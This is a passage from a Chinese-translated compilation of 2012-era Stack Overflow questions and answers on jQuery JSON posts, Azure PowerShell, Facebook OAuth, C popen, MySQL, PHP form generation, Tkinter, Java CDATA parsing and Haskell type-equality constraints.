> 发布 JSON 对象会给我的服务端字符串“id=10”。

Javascript 不会做你的这种转换，所以你的服务器会做。

您的服务器可能会根据`content-type`您的 POST 做出不同的反应，例如`application/json`vs `text/plain`or `text/html`，这是基于 REST 的服务的一个共同特征。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T13:11:32.473

这里的答案给了我一些提示，但最终，它需要进行大量调整才能正常工作。我必须做 3 件事：

1.  添加`processData: false`.
2.  将 JSON 对象转换为 JSON 字符串。如果我将其作为对象保留（即使我更改`contentType`为`application/json`），该请求也不会触发。
3.  更改`contentType to` `text/plain`. 这将其作为原始字符串发送。

这就是诀窍。我现在在服务器端得到了我想要的 JSON 字符串。

# powershell - 如何强制 Powershell 使用新的 Azure 订阅

> ID：11553682
> 
> 赞同：8
> 
> 时间：2012-07-19T03:53:13.907
> 
> 标签：powershell, azure

我有两个订阅，一个是旧云服务，另一个是新云服务。我正在使用 Powershell 访问我的新订阅。我已下载最新的 .publishsettings 并使用 Import-AzurePublishSettingsFile 进行设置。我的问题是我总是得到旧的订阅集并且无法弄清楚如何强制 powershell 使用我的新订阅。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-11-08T23:36:46.857

澄清一下，有两种“特殊”订阅，“当前”订阅（用于当前 PowerShell 会话中的任何命令的订阅）和默认订阅，即使在当前 PowerShell 之后使用的订阅会话结束。

using`Select-AzureSubscription <subscription-name>`将设置当前订阅。如果您想跨会话更改订阅，请使用`Select-AzureSubscription -Default <subscription name>`

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-07-19T04:05:32.290

使用新的 Powershell 命令，您需要设置要使用的特定订阅。步骤如下：

1.  **Import-AzurePublishSettingsFile *yourpublishsettings* .publishsettings**
2.  **Get-AzureSubscription**（这将为您提供订阅列表）
3.  **Select-AzureSubscription _select_subscription_name**（这样您可以设置要使用的特定订阅）

这应该工作！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-11-09T16:18:25.803

此答案适用于经典 Azure 管理。如果你在新的 ARM 上，那么你想做类似的事情

```
Login-AzureRmAccount
Get-AzureRmSubscription
Set-AzureRmContext -SubscriptionId blah 
```

其中 blah 是第二个命令的订阅 ID

# python - Facebook 返回的 URL 中的访问令牌在哪里？

> ID：11553683
> 
> 赞同：0
> 
> 时间：2012-07-19T03:53:14.627
> 
> 标签：python, facebook, oauth-2.0

我请求为我的 Django 应用程序向 Facebook 验证服务器端。

```
def authenticateViaFacebook(request):                   
  '''
  Redirects users to a page that allows for Facebook login.
  '''
  consumer = oauth2.Consumer(
      key = settings.FACEBOOK_APP_ID,
      secret = settings.FACEBOOK_APP_SECRET)

  # Request token URL for Facebook.
  request_token_url = "https://www.facebook.com/dialog/oauth/"

  # Create client.
  client = oauth2.Client(consumer)

  # Other arguments to Facebook.
  otherArguments = 'client_id=' + settings.FACEBOOK_APP_ID
  otherArguments += '&scope=email'
  otherArguments += '&redirect_uri=' + settings.SITE_URL
  otherArguments += 'authenticationRedirect/facebook'
  otherArguments += '&secret=' + settings.FACEBOOK_APP_SECRET

  # The OAuth Client request works just like httplib2 for the most part.
  res, content = client.request(request_token_url, "GET", otherArguments)

  # Examine the response.
  return HttpResponse(str(res)) 
```

我收到了 Facebook 的回复。

```
{'status': '200', 'content-length': '15753', 'x-xss-protection': '0', 
 'content-location': u'https://www.facebook.com/dialog/oauth/?oauth_body_hash=1YZMc0vtMcUa5nO81ZkuwoCSct4%3D&oauth_nonce=14826580&oauth_timestamp=1342669603&oauth_consumer_key=117889941688718&oauth_signature_method=HMAC-SHA1&oauth_version=1.0&oauth_signature=t2cIAmQYs4r5IqcsoODqorFIHbs%3D',  
 'x-content-type-options': 'nosniff', 'transfer-encoding': 'chunked',
 'expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'connection': 'keep-alive',
 '-content-encoding': 'gzip', 'pragma': 'no-cache', 
 'cache-control': 'private, no-cache, no-store, must-revalidate', 
 'date': 'Thu, 19 Jul 2012 03:46:44 GMT', 'x-frame-options': 'DENY', 
 'content-type': 'text/html; charset=utf-8', 
 'x-fb-debug': 'cXSDiq5jL9ZffjalabM6QKEgr50QOhPJsNlHW2MpSSQ='} 
```

我有点困惑，因为我没有看到一个名为“访问令牌”的变量，我什至看到了和之类的奇怪术语`auth_signature_method`，`oauth_signature`但我不知道它们是什么意思。

如何从 Facebook 检索访问令牌？此外，如何使用此访问令牌从用户那里检索“姓名”等基本信息？访问令牌只是一个字符串，对吧？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T07:00:08.783

我不知道你的代码。但是如果你使用 Facebook graph api 那就很简单了。

```
def authorize(self):

        warnings.filterwarnings('ignore', category=DeprecationWarning)
        savout = os.dup(1)
        os.close(1)
        os.open(os.devnull, os.O_RDWR)
        try:
            webbrowser.open(FBOAuth.FACEBOOK_GRAPH_URL+'/oauth/authorize?'+urllib.urlencode(
                                {'client_id':FBOAuth.CLIENT_ID,
                                 'redirect_uri':FBOAuth.REDIRECT_URI,
                                 'scope':'read_stream, publish_stream'}))
        finally:
            os.dup2(savout, 1)

        FBOAuth.SECRET_CODE = raw_input("Secret Code: ")
        self.save_secret_code(FBOAuth.SECRET_CODE)

        return FBOAuth.SECRET_CODE

def access_token(self):
if not FBOAuth.SECRET_CODE:
    FBOAuth.SECRET_CODE = self.authorize()

args = {'redirect_uri': FBOAuth.REDIRECT_URI,
        'client_id' : FBOAuth.CLIENT_ID,
        'client_secret':FBOAuth.CLIENT_SECRET,
        'code':FBOAuth.SECRET_CODE,}

access_token = urllib.urlopen(FBOAuth.FACEBOOK_GRAPH_URL + "/oauth/access_token?" + urllib.urlencode(args)).read()
access_token = urlparse.parse_qs(access_token)
FBOAuth.ACCESS_TOKEN = access_token['access_token'][0]
self.save_access_token(FBOAuth.ACCESS_TOKEN)
return FBOAuth.ACCESS_TOKEN 
```

通过这两个功能，您可以获得访问令牌。 [这](http://task3.cc/376/handle-facebook-oauth-authentication-with-python-sdk/)是我使用的教程的链接。 [Facebook graph api 文档](https://developers.facebook.com/docs/reference/api/)供参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T03:44:05.317

您的代码在几个方面是错误的，主要是忘记了您需要让用户参与交易。

有关要遵循的步骤，请参阅[https://developers.facebook.com/docs/authentication/server-side/](https://developers.facebook.com/docs/authentication/server-side/)，这些实际上非常简单，您可以使用 curl 手动完成所有操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T07:18:36.570

就像大多数身份验证过程一样，您传入您的应用 ID，然后取回一个“代码”。在第二个“GET”中，您将其发送到 access_token。您需要对结果进行解密，结果可能在 HMAC 中。使用SDK来管理这些功能，按照其他人的建议，会更容易。

“auth_signature_method”表示加密签名的签名方式。它不是您可以用来在 Facebook 上查询用户数据的最终 access_token。

# c# - 我可以使用什么控件来创建类似 facebook 收藏夹编辑屏幕的内容

> ID：11553685
> 
> 赞同：-1
> 
> 时间：2012-07-19T03:53:18.010
> 
> 标签：c#, asp.net, facebook, user-interface, user-controls

我想创建一个类似于 facebook 收藏夹编辑屏幕的控件（见图）。我正在研究 ASP.NET

谢谢

![示例 facebook 收藏夹窗口](../Images/ebd473f8d5ab64779b23575f0c645e3b.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-24T10:24:06.953

要创建此功能将需要相当多的 javacript/jQuery 和 AJAX 技能。您可以使用新的 ASP.NET WebAPI 来实现大部分后端功能。

如果您具备这些技能 - 请更具体地说明您需要帮助的内容。

如果没有，最好的办法是搜索组件框架和供应商的网站，例如 jQueryUI、Infragistics、Telerik 等。我怀疑你会找到任何可以做所有事情的东西。

相反，将其分解成更小的部分。从自动完成搜索框开始。然后你可以使用类似 knockoutjs 的东西在它下面显示收藏夹列表。然后使用 jQuery 添加删除收藏夹等功能。

最后 - 在所有浏览器上彻底测试！

# c - 如何在 char 数组中获取“date”命令的输出？

> ID：11553686
> 
> 赞同：4
> 
> 时间：2012-07-19T03:53:20.710
> 
> 标签：c, linux

我想把 GNU/Linux`date`命令的输出放在一个字符数组中。

例子：

```
char array[25]; 
```

```
$ date
Thu Jul 19 09:21:31 IST 2012 
```

```
printf("%s", array);
/* Should display "Thu Jul 19 09:21:31 IST 2012" */ 
```

我试过这个：

```
#include <stdio.h>
#include <string.h>

#define SIZE 50

int main()
{
    char array[SIZE];

    sprintf(array, "%s", system("date"));
    printf("\nGot this: %s\n", array);

    return 0;
} 
```

但输出显示`NULL`在数组中。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-19T03:59:42.660

用于`popen`能够读取命令的输出。确保使用 关闭流`pclose`。

```
FILE *f = popen("date", "r");
fgets(array, sizeof(array), f);
pclose(f); 
```

但是，您可以使用`localtime`and`strftime`而不是执行外部程序。

```
time_t t = time(0);
struct tm lt;
localtime_r(&t, &lt);
strftime(array, sizeof(array), "%a %b %d &T %z %Y", &lt); 
```

`ctime`类似，但不包括时区。

```
ctime_r(&t, array); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T04:00:01.797

当您调用 时`system(command)`，它的返回值不是`char*`命令输出的 a，而是命令的退出代码。命令成功完成，并返回`0`；这就是为什么你看到一个`NULL`. 如果要获取`"date"`命令返回的字符串，则需要捕获输出流并将其转换为字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-19T06:01:37.717

```
#include <stdio.h>
#include <time.h>

int main(void)
{
    time_t result;
    char array[25] = {'\0'};
    result = time(NULL);
    sprintf(array, "%s", asctime(localtime(&result)));
    printf("%s", array);
    return(0);
} 
```

# domain-driven-design - 编排不同的有界上下文，是谁的责任？

> ID：11553687
> 
> 赞同：2
> 
> 时间：2012-07-19T03:53:28.760
> 
> 标签：domain-driven-design, integration, soa, bounded-contexts

我有 3 个使用具有 REST 接口的不同数据库的独立服务：

*   第一服务：客户信息
*   第二项服务：关于客户交易的信息
*   第三项服务：有关客户文档的信息

问题：每个客户都有一个状态，应该根据他的**交易**和**文件**进行评估。

哪个服务应该负责这个评估，我应该如何实现其他服务之间的编排？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T21:00:32.297

如果可以的话，我会创建第四个服务。这样你就有了一个返回你需要的服务，避免了调用 2 个服务和合并结果集的问题（和过度的闲聊）。否则，如果您无权创建第 4 个服务，则可以编写一个代理服务，通过一个调用调用其他 2 个服务并尽可能使用数据缓存来缓存数据，以尝试帮助减少多个将来会为经常询问的客户打电话。

# c# - WPF Prism：从区域/视图访问 shell 变量

> ID：11553688
> 
> 赞同：0
> 
> 时间：2012-07-19T03:53:39.273
> 
> 标签：c#, wpf, shell, prism

有没有一种方法可以在使用 WPF Prism 时从每个区域访问父 shell 的变量？我想在创建许多 shell 时为 shell 设置一个唯一标识符。

所以到最后，我需要我的区域/视图中的对象能够访问该 shell 中常见的一个变量。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T18:52:57.900

将标识符放在 shell 中定义的区域的区域上下文中。您可以实现一些简单的行为以允许视图/视图模型轻松访问上下文变量，因为默认区域上下文行为存在很大缺陷。

但是，我想知道为什么您的视图需要了解它们所在的外壳，因为这与 Prism 设计原则背道而驰。

我希望您没有使用 ID 来过滤来自其他 shell 窗口的事件聚合器中的事件...

# azure - 在 Visual Studio 中，我可以将 C# 部署到我自己的 Azure 虚拟机而不是 Azure 辅助角色吗？

> ID：11553689
> 
> 赞同：3
> 
> 时间：2012-07-19T03:53:42.533
> 
> 标签：azure, virtual-machine, azure-worker-roles

在许多 Visual Studio 演示中，您可以将后台辅助角色程序（如控制台应用程序或其他东西）部署到 Azure。您是否知道是否可以将这些辅助角色部署定向到我正在运行的 Azure 虚拟机？

非常感谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T04:02:27.660

您不能使用您在 Web/Worker 角色中看到的相同部署方法，但是您肯定可以将应用程序从 Visual Studio 部署到 Azure VM，但是您选择的介质必须由您配置。因为 Windows Azure VM 主要由用户配置和维护，这就是为什么没有预先构建的机制供任何人从开发机器部署应用程序，这一切都必须配置和选择。

在您的情况下，如果您想直接从 VS 部署，您可以在 Azure VM 中配置 web-deploy 选项（与任何删除 VM 完全相同），以便您可以直接部署。或者，您实际上也可以将 Powershell 配置为直接从命令行部署，只需在 Azure VM 中配置 Powershell 远程设置。

底线是您必须选择和配置自己的方式来从本地计算机部署应用程序，主要是因为您对 Azure VM 拥有更多所有权，就像在任何其他 IaaS 云中一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:59:31.557

不可以。您将无法通过 Visual Studio 在 Azure 虚拟机中部署应用程序。您可以通过 VS 部署的应用程序是 PaaS 应用程序（Web/Worker 角色）。

# mysql - 存在一个特定用户的组中的用户数量mysql

> ID：11553692
> 
> 赞同：0
> 
> 时间：2012-07-19T03:54:11.770
> 
> 标签：mysql, query-optimization

我正在尝试优化此查询，但我似乎无法得到它。任何帮助都非常受欢迎。这是在存储过程中，因此 1 被 IN 参数替换。

* * *

表**userGroupRelation**

userGroupID BIGINT --> 组表中 userGroupID 的外键

userID BIGINT --> users 表的外键

* * *

表**文件夹**

ownerID BIGINT --> users 表的外键

postersGroup BIGINT --> 组表中 userGroupID 的外键

其他的东西 ...

* * *

```
SELECT folders.*,COUNT(userGroupRelation.userID) AS users
  FROM folders
LEFT JOIN userGroupRelation
  ON folders.postingGroupID = userGroupRelation.userGroupID
WHERE folders.ownerID = 1
  OR userGroupRelation.userGroupID IN (
    SELECT userGroupID FROM userGroupRelation WHERE userID = 1)
GROUP BY folders.folderID; 
```

* * *

我基本上想获取用户可以看到的所有文件夹（因为他拥有它或者因为他在该文件夹的一组海报中）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T05:40:08.900

我建议两种方法。一个与您自己的类似，但删除了子查询并更正了`COUNT`子句。我应该提到，从您的问题中不清楚`COUNT ... AS users`结果是否在这里很重要，因为您只指定要获取用户的所有文件夹。

```
SELECT 
  folders.*,
  COUNT(DISTINCT IFNULL(userGroupRelation.userID, folders.ownerID)) AS users
FROM 
  folders
  LEFT JOIN userGroupRelation ON folders.postingGroupID = userGroupRelation.userGroupID
WHERE 
  folders.ownerID = 1
  OR userGroupRelation.userID = 1
GROUP BY 
  folders.folderID
; 
```

这比您自己的解决方案要好一些，因为子查询被消除了，但它仍然存在`OR`难以优化的这种情况——它适用于两个不同的表。

**编辑**：下一个解决方案既没有回答问题，也根本不起作用:(

一种完全不同的方法是从`users`表开始（当然，假设你有一个）：

```
SELECT 
  folders.*
FROM 
  users
  LEFT JOIN folders ON (folders.ownerID = users.id)
  LEFT JOIN userGroupRelation ON (userGroupRelation.userId = users.id)
  LEFT JOIN folders ON (folders.postingGroupID = userGroupRelation.userGroupID)
WHERE 
  users.id = 1
GROUP BY 
  folders.folderID
; 
```

`users.id`如果您对所有连接列都有适当的索引，则此优化效果要好得多。然而：

1.  它不会告诉您每个文件夹的（其他）用户数量
2.  `SELECT filders.* .... GROUP BY filders.folderId`不是严格有效的 SQL——尽管如果您不使用 strict 它将起作用`sql_mode`。从您自己的查询中，我可以看出您不是，所以我不会详述。

# php - PHP/Javascript 表单构建器/模式定义器

> ID：11553694
> 
> 赞同：3
> 
> 时间：2012-07-19T03:54:16.997
> 
> 标签：php, javascript, forms, frameworks

我知道这听起来很像“是否有一个 PHP 框架可以为我完成*整个工作*？” 但请忍受我。

假设我想为一个营地创建一个注册表单，并且我有一个简单的数据结构——

人

*   名
*   姓
*   *地址*

地址

*   1号线
*   2号线
*   市郊
*   镇

ETC

我所看到的部分但不是我想要的全部：

像 jFormer 和 ValidForm 这样的 PHP 表单库（更不用说所有的大框架了）：这些东西让你可以使用一点 PHP 来定义你想要制作的表单——所以你会说“添加文本字段，添加文本区域”，等等——但它们不会让用户编辑表单数据结构，也不会自动保存到数据结构中。它们对开发人员更有用。

前端表单创建者，如 foxyform、jotform：他们让用户编辑表单，但后端需要以其他方式完成，并且没有链接。

然后是[Wordpress Pods CMS](http://podsframework.org/)，这几乎正是我想要的——但没有 wordpress 部分。

理想情况下，我想要两件事之一：

1) 一个微框架，您可以在其中以某种相当简单的方式定义数据模式，例如 Json 或 Yaml——您的基本

```
Person
  First name: Text
  Last name: Text
  Address: has_one Address
Address
  ... and so on 
```

它会采用它并创建您需要的表单，甚至可能创建数据库模式等等。然后，您可以获取数据对象以在其他地方的代码中进行迭代（我还没有疯狂到尝试将其自动化......或者也许我是，但肯定感觉超出了这个特定封装的范围） .

或者

2）以上，加上一个用于编辑数据模式的小编辑器。

```
Create data type:

Name: [Person]

Fields:

  First name: [Text field]

[+ Add field] 
```

我环顾四周，没有发现任何小型且独立的东西，并且可以做到这一点。Pods CMS 几乎正是我想要的，但更小更干净，并且不依赖于 Wordpress。

这样的事情存在吗？如果不是——我在这里偏离了观点，但我会抓住机会——看起来这样的事情应该存在吗？能够将这样的东西放到任何应用程序中，然后自己编写模式或允许用户编辑它，这不是很好吗？它看起来并不难，而且可以在很多情况下使用。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-19T08:04:16.563

我不太确定是否存在这样的个性化细节，但让我们试一试：

首先你应该创建你的类：

```
class Person{
  private $first_name;
  private $last_name;
  private $adress;

  public function __construct($data=array(), adress $adress=null){
    foreach ($data as $cle => $valeur)
      $this->$cle=$valeur;
    $this->adress=$adress;
  }
  public function __get($property){
    return $this->$property;
  }
  public function __set($property,$value)
  {
    $this->$property=$value;
  }     
  public function all_object_properties() {
    return get_object_vars($this);
  }
  public function all_class_properties(){
    return get_class_vars(__CLASS__);
  }
}
class Adress{
  private $id;
  private $line_1;
  private $line_2;
  private $suburb;

  public function __construct($data=array()){
    foreach ($data as $cle => $valeur)
      $this->$cle=$valeur;
  }
  public function __get($property){
    return $this->$property;
  }
  public function __set($property,$value)
  {
    $this->$property=$value;
  }     
  public function all_object_properties() {
    return get_object_vars($this);
  }
  public function all_class_properties(){
    return get_class_vars(__CLASS__);
  }
  public function fill($id){
    $connexion=db_connect();
    $req=$connexion->prepare("SELECT * FROM adresses WHERE id=:id");
    $req->execute(array('id'=>$id));
    while ($row = $req->fetch(PDO::FETCH_ASSOC)){
      foreach ($row as $cle => $valeur)
        $this->$cle=$valeur;
    }
    return $this;
  }
  public function save(){
    $connexion=db_connect();
    $sql1="INSERT INTO adresses (";
    $sql2=" VALUES (";
    $vars=$this->all_properties();
    foreach($vars as $var=>$value){
      $sql1.=$var.", ";
      $sql2.=":".$var.", ";
    }
    $sql1=substr($sql1,0,-2).")";
    $sql2=substr($sql2,0,-2).")";
    $sql=$sql1.$sql2;
    $query=$connexion->prepare($sql);
    $query->execute($vars);
    if($query){
      $this->id=$connexion->lastInsertId();
      return true;
    }else{
      return false;
    }
  }
  public function update(){
    $connexion=db_connect();
    $sql1="UPDATE adresses SET ";
    $vars=$this->all_properties();
    foreach($vars as $var=>$value){
       $sql1.=$var."=".":".$var.", ";
    }
    $sql1=substr($sql1,0,-2)." WHERE id=:id";
    $query=$connexion->prepare($sql1);
    $query->execute($vars);
    if($query){
       return true;
    }else{
       return false;
    }
  }
} 
```

然后，您希望能够基于 JSON 甚至 XML 等文件创建表单：

```
<forms>
  <form>
    <host>name_of_my_page_where_my_form_is_displayed.php</host>
    <method>post</method>
    <target>#</method>
    <input>
       <type>text</type>
       <name>first_name</type>
       <class>Person</class>
    </input>
    <input>
       <type>text</type>
       <name>last_name</type>
       <class>Person</class>
    </input>
    <input>
       <type>text</type>
       <name>line_1</type>
       <class>Adress</class>
    </input>
    <input>
       <type>text</type>
       <name>suburb</type>
       <class>Adress</class>
    </input>
  </form>
</forms> 
```

在这里，您需要一个函数来解析和创建表单：

```
function display_form($xml_file,$page_to_display){
  $content=null;
  $values=array();
  $dom = new DOMDocument;
  $dom->load($xml_file);
  $forms=$dom->getElementsByTagName("form");
  foreach($forms as $form){
    $urls = $form->getElementsByTagName( "host" );
    $url = $urls->item(0)->nodeValue;
    if($url==htmlspecialchars($page_to_display)){
      $tp_method = $form->getElementsByTagName( "method" );
      $method = $tp_method->item(0)->nodeValue;
      $tp_target = $form->getElementsByTagName( "target" );
      $target = $tp_target->item(0)->nodeValue;
      $content="<form action=".$target." method=".$method."><br/>";
      $inputs=$dom->getElementsByTagName("input");
      foreach($inputs as $input){
        $tp = $form->getElementsByTagName( "type" );
        $type = $tp->item(0)->nodeValue;
        $tp = $form->getElementsByTagName( "name" );
        $name = $tp->item(0)->nodeValue;
        $tp = $form->getElementsByTagName( "class" );
        $class = $tp->item(0)->nodeValue;
        $content.="<input type=".$type." name=".$name."/><br/>";
        $values[]=array("class"=>$class,"name"=>$name);
      }
      $content.="<input type='submit' value='Submit'/>";
    }
  }
  return array("content"=>$content,"values"=>$values);
} 
```

最后在显示表单的页面中：

```
<?php
$array=display_form("forms.xml",$_SERVER['REQUEST_URI']);
$content=$array['content'];
$values=$array['values'];
$classes=array();
$names=array();
foreach($values as $tab){
  $class=$tab['class'];
  $name=$tab['name'];
  $classes[]=(!in_array($class,$classes)) ? $class : null;
  $names[]=$name;
  ${$class}[]=$name;
}
$form_submitted=true;
foreach($names as $name){
  if(!isset($_POST[$name]))
    $form_submitted=false;
}
if($form_submitted){
  foreach($classes as $name_class){
    $var= new $name_class;
    foreach(${$name_class} as $value){
     $var->__set($value,$_POST[$value]);
    }
    $var->save();
  }
}
echo $content; 
```

此外，您可能希望创建一个函数来填充您的 xml。在每个类中，您可以使用函数 fill() 根据 ID 检索数据库中对象的数据，使用 save() 在数据库中创建新插入，或使用 update() 根据 ID 更新已存在的行. 可以做很多改进，但总体思路就在这里。随意改进它并成为你的！

# python - Tkinter：列表框拖动选择

> ID：11553695
> 
> 赞同：0
> 
> 时间：2012-07-19T03:54:18.917
> 
> 标签：python, listbox, tkinter, mouse, coordinates

我在右键选择它的方式上遇到问题。我不擅长坐标，所以我不知道如何反转我选择的方式。我想以鼠标移动的方式滚动列表框选择，而不是像现在这样反向滚动。我只是希望它在向下/向上移动鼠标时选择列表框中的下一项。

```
from Tkinter import *

def _select(y):
    row = lb.nearest(y)
    lb.selection_clear(0, END)
    lb.selection_set(row)

def _b2motion(x, y):
    lb.scan_dragto(x, y)
    _select(y)
    return 'break'

root = Tk()

sb = Scrollbar(root)
lb =Listbox(root, width=20,yscrollcommand=sb.set)

lb.bind('<B3-Motion>', lambda e: _b2motion(e.x, e.y))
sb.config(command=lb.yview)

lb.grid(row=0,column=0)
sb.grid(row=0,column=1,sticky=N+S)

for x in range(50):
    lb.insert(END, x)

mainloop() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T19:18:17.153

如果您翻转运动框中 y 上的符号，将改变滚动方向。如果你需要它更慢，除以一个整数，我喜欢 3。

```
def _b2motion(x, y):
    lb.scan_dragto(x, (-y/3)) #here
    _select(y)
    return 'break' 
```

我不确定你剩下的问题是什么......你是否试图复制左按钮和右按钮的作用？

# java - 在 Java 中读取 CDATA XML

> ID：11553697
> 
> 赞同：14
> 
> 时间：2012-07-19T03:54:48.993
> 
> 标签：java, xml, parsing

我正在尝试解析 XML 中的 CDATA 类型。代码运行良好，它将在控制台中打印 Links: （大约 50 次，因为这是我拥有的链接数），但链接不会出现......它只是一个空白的控制台空间。我会错过什么？

```
package Parse;

import java.io.File;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.CharacterData;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class XMLParse {
  public static void main(String[] args) throws Exception {
    File file = new File("c:test/returnfeed.xml");
    DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
    Document doc = builder.parse(file);

    NodeList nodes = doc.getElementsByTagName("video");
    for (int i = 0; i < nodes.getLength(); i++) {
      Element element = (Element) nodes.item(i);
      NodeList title = element.getElementsByTagName("videoURL");
      Element line = (Element) title.item(0);
      System.out.println("Links: " + getCharacterDataFromElement(line));
    }
  }
  public static String getCharacterDataFromElement(Element e) {
    Node child = e.getFirstChild();
    if (child instanceof CharacterData) {
      CharacterData cd = (CharacterData) child;
      return cd.getData();
    }
    return "";
  }
} 
```

结果：

```
Links: 

Links: 

Links: 

Links: 

Links: 

Links: 

Links: 
```

示例 XML：（不是完整文档）

```
<?xml version="1.0" ?> 
<response xmlns:uma="http://websiteremoved.com/" version="1.0">

    <timestamp>
        <![CDATA[  July 18, 2012 5:52:33 PM PDT 
          ]]> 
    </timestamp>
    <resultsOffset>
        <![CDATA[  0 
          ]]> 
    </resultsOffset>
    <status>
        <![CDATA[  success 
        ]]> 
    </status>
    <resultsLimit>
        <![CDATA[  207 
        ]]> 
    </resultsLimit>
    <resultsCount>
        <![CDATA[  207 
        ]]> 
    </resultsCount>
    <videoCollection>
        <name>
            <![CDATA[  Video API 
            ]]> 
        </name>
        <count>
            <![CDATA[  207 
            ]]> 
        </count>
        <description>
            <![CDATA[  
            ]]> 
        </description>
        <videos>
            <video>
                <id>
                    <![CDATA[  8177840 
                    ]]> 
                </id>
                <headline>
                    <![CDATA[  Test1
                    ]]> 
                </headline>
                <shortHeadline>
                    <![CDATA[  Test2
                    ]]> 
                </shortHeadline>
                <description>
                    <![CDATA[ Test3

                    ]]> 
                </description>
                <shortDescription>
                    <![CDATA[ Test4

                    ]]> 
                </shortDescription>
                <posterImage>
                    <![CDATA[ http://a.com.com/media/motion/2012/0718/los_120718_los_bucher_on_howard.jpg

                    ]]> 
                </posterImage>
                <videoURL>
                    <![CDATA[ http://com/removed/2012/0718/los_120718_los_bucher_on_howard.mp4

                    ]]> 
                </videoURL>
            </video>
        </videos>
    </videoCollection>
</response> 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-07-19T13:36:24.217

与其检查第一个孩子，不如谨慎地考虑该节点是否还有其他孩子。在您的情况下（我猜如果您已经调试过该节点，您就会知道），传递给该方法的节点`getCharacterDataFromElement`有多个子节点。我更新了代码，这可能会为您指明正确的方向：

```
public static String getCharacterDataFromElement(Element e) {

    NodeList list = e.getChildNodes();
    String data;

    for(int index = 0; index < list.getLength(); index++){
        if(list.item(index) instanceof CharacterData){
            CharacterData child = (CharacterData) list.item(index);
            data = child.getData();

            if(data != null && data.trim().length() > 0)
                return child.getData();
        }
    }
    return "";
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-10-01T17:51:00.327

我会考虑使用 getTextContent()

```
String string = cdataNode.getTextContent(); 
```

# haskell - Haskell：实例中的平等约束

> ID：11553705
> 
> 赞同：37
> 
> 时间：2012-07-19T03:55:58.243
> 
> 标签：haskell

我正在阅读[ClassyPrelude](http://www.yesodweb.com/blog/2012/07/classy-prelude)的公告并到达这里：

```
instance (b ~ c, CanFilterFunc b a) => CanFilter (b -> c) a where
    filter = filterFunc 
```

然后作者提到这行不通：

```
instance (CanFilterFunc b a) => CanFilter (c -> c) a where
    filter = filterFunc 
```

这对我来说很有意义，因为`c`与左侧的约束完全无关。

但是，文章中没有提到并且我不明白的是为什么这不起作用：

```
instance (CanFilterFunc b a) => CanFilter (b -> b) a where
    filter = filterFunc 
```

有人可以解释为什么这与第一个提到的定义不同吗？也许 GHC 类型推断的工作示例会有所帮助？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2012-07-19T06:02:24.147

Michael 在他的博客文章中已经给出了很好的解释，但我将尝试用一个（人为的，但相对较小的）示例来说明它。

我们需要以下扩展：

```
{-# LANGUAGE FlexibleInstances, TypeFamilies #-} 
```

让我们定义一个比 简单的类，`CanFilter`只有一个参数。我正在定义该类的两个副本，因为我想演示两个实例之间的行为差​​异：

```
class Twice1 f where
  twice1 :: f -> f

class Twice2 f where
  twice2 :: f -> f 
```

现在，让我们为每个类定义一个实例。对于`Twice1`，我们直接将类型变量固定为相同，对于`Twice2`，我们允许它们不同，但添加一个等式约束。

```
instance Twice1 (a -> a) where
  twice1 f = f . f

instance (a ~ b) => Twice2 (a -> b) where
  twice2 f = f . f 
```

为了显示差异，让我们定义另一个重载函数，如下所示：

```
class Example a where
  transform :: Int -> a

instance Example Int where
  transform n = n + 1

instance Example Char where
  transform _ = 'x' 
```

现在我们已经到了可以看到差异的地步。一旦我们定义

```
apply1 x = twice1 transform x
apply2 x = twice2 transform x 
```

并向 GHC 询问推断的类型，我们得到了

```
apply1 :: (Example a, Twice1 (Int -> a)) => Int -> a
apply2 :: Int -> Int 
```

这是为什么？好吧，`Twice1`仅当函数的源类型和目标类型相同时才会触发实例。对于`transform`给定的上下文，我们不知道。GHC 只会在右侧匹配时应用实例，所以我们留下了未解析的上下文。如果我们尝试说`apply1 0`，则会出现类型错误，表示仍然没有足够的信息来解决重载问题。`Int`在这种情况下，我们必须明确指定要通过的结果类型。

但是，在 中`Twice2`，实例适用于任何函数类型。GHC 会立即解决它（GHC 永远不会回溯，所以如果一个实例明显匹配，它总是被选中），然后尝试建立先决条件：在这种情况下，相等约束，然后强制结果类型为`Int`，并允许我们也解决`Example`约束。我们可以说`apply2 0`没有进一步的类型注释。

所以这是关于 GHC 的实例解析的一个相当微妙的点，这里的等式约束有助于 GHC 的类型检查器以一种需要用户更少类型注释的方式进行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-17T20:18:11.440

完成@kosmikus 的回答

这同样适用于 purescript - 您需要等式约束才能正确派生类型（您可以在此处尝试[http://try.purescript.org](http://try.purescript.org)）

```
module Main where

import Prelude

-- copied from https://github.com/purescript/purescript-type-equality/blob/master/src/Type/Equality.purs
class TypeEquals a b | a -> b, b -> a where
  to :: a -> b
  from :: b -> a

instance refl :: TypeEquals a a where
  to a = a
  from a = a

-----------------

class Twice1 f where
  twice1 :: f -> f

class Twice2 f where
  twice2 :: f -> f
